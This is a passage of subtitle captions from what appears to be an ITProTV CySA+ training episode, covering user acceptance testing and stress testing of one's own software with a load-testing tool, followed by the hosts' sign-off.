00:23:39.408\n[INAUDIBLE].\n\n478\n00:23:39.408 --> 00:23:43.443\nYou can't do that, maybe you need to\ngo back to my logic on how you access\n\n479\n00:23:43.443 --> 00:23:47.564\nthe admin area from those specific\nitems and see where the flaw comes in.\n\n480\n00:23:47.564 --> 00:23:51.356\nSo that's also a great way to test your\nproduct for both just regular bugs and\n\n481\n00:23:51.356 --> 00:23:53.503\nflaws, but also security issues as well.\n\n482\n00:23:53.503 --> 00:23:54.533\n&gt;&gt; UAT.\n\n483\n00:23:54.533 --> 00:23:58.105\n&gt;&gt; UAT, then we move into stress testing.\n\n484\n00:23:58.105 --> 00:24:00.001\nStress testing is kinda cool.\n\n485\n00:24:00.001 --> 00:24:03.670\nBasically, you've got your product,\nit's launched, it's up.\n\n486\n00:24:03.670 --> 00:24:09.980\nBefore we actually let the world do\ntheir thing and hammer away at it,\n\n487\n00:24:09.980 --> 00:24:15.130\nmaybe we want to make sure that it\ncan handle the world coming at it.\n\n488\n00:24:15.130 --> 00:24:18.293\nBe that just my internal user base,\nor if it's a web app and\n\n489\n00:24:18.293 --> 00:24:20.886\nit's gonna face external\nout to the Internet.\n\n490\n00:24:20.886 --> 00:24:22.486\nHowever it's being used,\n\n491\n00:24:22.486 --> 00:24:27.390\nI need to make sure it can handle the load\nthat it's going to have put against it.\n\n492\n00:24:27.390 --> 00:24:29.190\nEspecially during peak times,\n\n493\n00:24:29.190 --> 00:24:32.460\nI need to find out what peak load\nwould look like, and then run that.\n\n494\n00:24:32.460 --> 00:24:33.420\nNow the cool thing is,\n\n495\n00:24:33.420 --> 00:24:38.150\nthere's some stress testing utilities out\nthere that will help you in this endeavor.\n\n496\n00:24:38.150 --> 00:24:39.500\nYou can go out there.\n\n497\n00:24:39.500 --> 00:24:44.580\nI've got one right here called AppPerfect,\nand it has a load test.\n\n498\n00:24:44.580 --> 00:24:49.210\nYou can download this,\nthe screenshots are actually super cool.\n\n499\n00:24:49.210 --> 00:24:52.610\nSo I didn't have to install it,\nI can just kinda come in here and\n\n500\n00:24:52.610 --> 00:24:57.070\nshow you that it gets the load generator,\nthe test settings, server monitoring, so\n\n501\n00:24:57.070 --> 00:24:59.140\nit's monitoring what's going on.\n\n502\n00:24:59.140 --> 00:25:01.860\nDistributed testing,\ncross browser testing, advanced settings,\n\n503\n00:25:01.860 --> 00:25:04.400\ndatabase settings, and then,\nof course, the results.\n\n504\n00:25:04.400 --> 00:25:05.790\n&gt;&gt; That's great.\n&gt;&gt; And you'll be able to say, yes,\n\n505\n00:25:05.790 --> 00:25:06.838\nthat's a really cool product.\n\n506\n00:25:06.838 --> 00:25:10.330\nYou'll be able to customize the load for\nthe stress test,\n\n507\n00:25:10.330 --> 00:25:13.890\nhammer up against your software,\nyour system.\n\n508\n00:25:13.890 --> 00:25:17.800\nLet it do its thing, and it's gonna\nmeasure its ability to handle that and\n\n509\n00:25:17.800 --> 00:25:19.140\ngive you that as a report.\n\n510\n00:25:19.140 --> 00:25:21.590\nSo of course, this is just one way\nin doing this and here's some more.\n\n511\n00:25:21.590 --> 00:25:23.120\n&gt;&gt; This is open-source too, right?\n\n512\n00:25:23.120 --> 00:25:24.552\n&gt;&gt; I don't know if it's open-source,\n\n513\n00:25:24.552 --> 00:25:25.850\nI didn't read around to it-\n&gt;&gt; Okay.\n\n514\n00:25:25.850 --> 00:25:26.800\n&gt;&gt; That far.\n\n515\n00:25:26.800 --> 00:25:29.700\nI found that it looked cool,\nshowed us screenshots.\n\n516\n00:25:29.700 --> 00:25:33.840\nSo again,\nmost of these things are pay for.\n\n517\n00:25:33.840 --> 00:25:36.770\nSo I wasn't gonna install this and\nup and run it anyway.\n\n518\n00:25:36.770 --> 00:25:39.502\n&gt;&gt; It looks great\n&gt;&gt; I don't have any code to try to\n\n519\n00:25:39.502 --> 00:25:40.293\ntest, so.\n\n520\n00:25:40.293 --> 00:25:43.504\n&gt;&gt; [LAUGH]\n&gt;&gt; There's the other part of the problem,\n\n521\n00:25:43.504 --> 00:25:44.870\nbut really cool stuff.\n\n522\n00:25:44.870 --> 00:25:48.262\nGiving you all those great capabilities,\nand it has some charts, and\n\n523\n00:25:48.262 --> 00:25:49.248\nvery well laid out.\n\n524\n00:25:49.248 --> 00:25:51.887\nI just like the layout of this thing,\nshowing you all the testing, and\n\n525\n00:25:51.887 --> 00:25:54.120\nwhat's going on, and\nthe tasks that are running.\n\n526\n00:25:54.120 --> 00:25:56.600\nWhere it's going against,\nwhat group it's happening against.\n\n527\n00:25:57.990 --> 00:25:59.870\nHere they create some Java Pet Store so\n\n528\n00:25:59.870 --> 00:26:02.910\nthat they can test\nthe Java Pet Store web app.\n\n529\n00:26:02.910 --> 00:26:05.209\nVery cool, so if you need to stress test,\n\n530\n00:26:05.209 --> 00:26:09.175\nsomething like this would be a really\ngood way to accomplish that feat.\n\n531\n00:26:09.175 --> 00:26:10.060\n&gt;&gt; Very good.\n\n532\n00:26:10.060 --> 00:26:11.526\n&gt;&gt; I'm gonna close that out.\n\n533\n00:26:11.526 --> 00:26:13.781\nAll right, Zach, I am looking at our time.\n\n534\n00:26:13.781 --> 00:26:15.856\nWe have very little time left, but\n\n535\n00:26:15.856 --> 00:26:19.690\nI think we got enough to\nprobably get a short part two.\n\n536\n00:26:19.690 --> 00:26:22.710\nYeah, but definitely too long for\nus to continue here in this part one, so?\n\n537\n00:26:22.710 --> 00:26:26.330\n&gt;&gt; Software development security,\nawesome episode, I really enjoyed this.\n\n538\n00:26:26.330 --> 00:26:29.975\nI learned an awful lot, and before we move\non, anything else you would like to say?\n\n539\n00:26:29.975 --> 00:26:31.143\n&gt;&gt; Just come back for part two, cuz-\n&gt;&gt; [LAUGH]\n\n540\n00:26:31.143 --> 00:26:31.676\n&gt;&gt; There's a lot\n\n541\n00:26:31.676 --> 00:26:33.365\nmore cool software we need to discuss-\n&gt;&gt; Yes, indeed.\n\n542\n00:26:33.365 --> 00:26:39.060\n&gt;&gt; When it comes to software developments\nsecurity, so be sure to check that out.\n\n543\n00:26:39.060 --> 00:26:40.950\n&gt;&gt; Awesome, thank you so much,\nDan, you're doing a great job.\n\n544\n00:26:40.950 --> 00:26:44.790\nIn fact, he's done a great job putting\ntogether the entire CySA+ series.\n\n545\n00:26:44.790 --> 00:26:46.973\nMake sure you see every single episode.\n\n546\n00:26:46.973 --> 00:26:50.545\nAnd by the way, you'll be in the course\nlibrary where there's thousands of hours\n\n547\n00:26:50.545 --> 00:26:53.490\nof other content there to help you\nsucceed, so check that out too.\n\n548\n00:26:53.490 --> 00:26:57.200\nAnd tell anybody you know about ITProTV,\nyou know ITProTV is bingeworthy.\n\n549\n00:26:57.200 --> 00:26:58.720\nThanks for watching, I'm Zach Memos.\n\n550\n00:26:58.720 --> 00:26:59.380\n&gt;&gt; And I'm Daniel Lowrie.\n\n551\n00:26:59.380 --> 00:27:01.529\n&gt;&gt; We will see you again soon.\n\n552\n00:27:01.529 --> 00:27:07.646\n[MUSIC]\n\n553\n00:27:07.646 --> 00:27:10.041\n&gt;&gt; Thank you for watching ITProTV.\n\n",
